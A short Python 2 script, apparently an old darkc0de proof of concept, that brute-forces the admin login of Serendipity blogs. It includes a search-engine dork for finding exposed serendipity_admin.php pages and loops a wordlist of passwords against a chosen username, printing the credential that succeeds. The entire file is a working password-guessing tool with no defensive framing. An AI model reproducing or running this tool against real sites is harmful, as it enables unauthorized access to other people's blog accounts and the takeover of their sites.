#!/usr/bin/python
#Serendipity Brute Force (serendipity_admin.php) POC

#Dork: "Powered by Serendipity" inurl:serendipity_admin.php

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com 

import urllib2, sys, re, urllib

print "\n   d3hydr8[at]gmail[dot]com SerenBF v1.0"
print "----------------------------------------------"

if len(sys.argv) != 4:
	print "Usage: ./serenbf.py <site> <user> <wordlist>\n"
	sys.exit(1)
	
if sys.argv[1][:7] != "http://":
	host = "http://"+sys.argv[1]
else:
	host = sys.argv[1]
	
print "[+] BruteForcing:",host
print "[+] User:",sys.argv[2]

try:
  	words = open(sys.argv[3], "r").readlines()
  	print "[+] Words Loaded",len(words),"\n"
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)
  
for word in words:
	login_form_seq = [
		('serendipity[action]', 'admin'),
     	('serendipity[user]', sys.argv[2]),
     	('serendipity[pass]', word[:-1]),
     	('serendipity[auto]', 'on'),
     	('submit', 'Login >')]
	login_form_data = urllib.urlencode(login_form_seq)
	
	try:
		req = urllib2.Request(url=host, data=login_form_data)
		site = urllib2.urlopen(req).read()
	except(urllib2.URLError):
		site = ""
		pass
		
	#Change this response if different. (language)
	if re.search("invalid username or password",site):
		print "[-] Login Failed:",word[:-1]
	else:
		print "\n\t[!] Login Successfull:",sys.argv[2],word
		sys.exit(1)
print "\n[-] Brute Complete\n"
	
